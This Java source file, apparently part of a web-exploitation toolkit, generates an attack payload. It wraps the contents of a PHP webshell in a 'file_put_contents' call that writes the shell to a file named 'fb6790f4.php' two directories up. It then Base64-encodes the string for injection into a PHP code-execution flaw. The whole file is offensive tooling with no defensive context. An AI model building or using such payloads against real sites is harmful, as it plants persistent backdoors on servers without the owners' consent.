import cn.hutool.core.util.RandomUtil;

import java.io.UnsupportedEncodingException;
import java.util.concurrent.ExecutionException;
import sun.misc.BASE64Encoder;
import utils.shell;

public class SimpleTest {

    private static Object pop;

    public static void main(String[] args) throws InterruptedException, ExecutionException {
        try {
            BASE64Encoder encoder = new BASE64Encoder();
            String text = "file_put_contents('../../fb6790f4.php','" + shell.readFile(shell.Phppath) +"');";
            byte[] textByte = text.getBytes("UTF-8");
            String encodedText = encoder.encode(textByte).replace("\r\n","");
            System.out.println(encodedText);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

    }
}